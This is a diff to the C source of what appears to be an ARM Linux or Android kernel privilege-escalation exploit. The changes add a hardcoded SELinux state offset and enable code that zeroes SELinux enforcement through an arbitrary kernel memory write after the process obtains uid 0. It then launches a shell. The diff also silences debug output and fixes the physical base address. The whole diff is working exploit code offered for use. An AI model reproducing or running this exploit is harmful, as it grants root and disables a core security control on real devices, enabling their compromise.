@@ -525,6 +525,9 @@ usize linear_base = 0;
 #define PIPE_OPS_OFFSET (0xffffffc0123396e8 - KERNEL_BASE)
 #define INIT_OFFSET (0xffffffc0129cbe40 - KERNEL_BASE)
 
+// optinally define to turn off selinux
+#define SELINUX_STATE_OFFSET (0xffffffc012c73b18 - KERNEL_BASE)
+
 // first 64 bit word of kernel image
 #define KERNEL_START_WORD 0x149abfff91005a4d
 
@@ -865,6 +868,7 @@ void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
 #ifdef ARM
 
 void scan_kernel_phys_base() {
+  // scanning did not work for some reason
   phys_base = PHYS_BASE;
   // phys_base = 0;
   // for (;;) {
@@ -1123,11 +1127,11 @@ void exploit() {
       getchar();
       panic("done");
     }
-    printf("new task: %lx\n", current_task);
+    // printf("new task: %lx\n", current_task);
 
     unsigned long name[2] = { 0 };
     name[0] = read64_all(current_task + comm_offset);
-    printf("%s\n", name);
+    // printf("%s\n", name);
 
     if (!strcmp((char *)name, "expp")) {
       printf("we found the process at %lx\n", current_task);
@@ -1145,10 +1149,13 @@ void exploit() {
   seteuid(0);
 
   printf("now we uid/gid: %d/%d\n", getuid(), getgid());
-  // printf("disabling selinux...\n");
-  // selinux_state += kaslr_offset;
-  // // enforing is 1 byte, writing 8 bytes overwrites others
-  // write64(selinux_state - 7, 0);
+
+#ifdef SELINUX_STATE_OFFSET
+  printf("disabling selinux...\n");
+  // enforing is 1 byte, writing 8 bytes overwrites others
+  write64_kernel(SELINUX_STATE_OFFSET + kaslr_base - 7, 0);
+#endif
+
   system(SHELL);
 
   while (1) {
